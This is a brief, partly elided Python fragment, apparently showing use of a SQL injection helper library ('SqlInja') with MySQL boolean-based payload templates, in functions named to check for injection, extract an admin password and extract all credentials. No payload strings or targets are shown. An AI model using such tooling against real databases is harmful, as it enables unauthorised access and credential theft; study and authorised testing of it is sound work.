...
helper = SqlInja(MySqlConfig(), exec_request, MySqlConfig.payload_int_bool)

def check():
    helper.prepare_new(template=MySqlConfig.payload_int_bool)
...
def extract_admin_pass():
    ...
    helper.prepare_new(candidates, template=MySqlConfig.payload_str_bool)
...
def extract_all_creds():
    ...
    helper.prepare_new([*range(0, 500)], template=MySqlConfig.payload_int_bool)
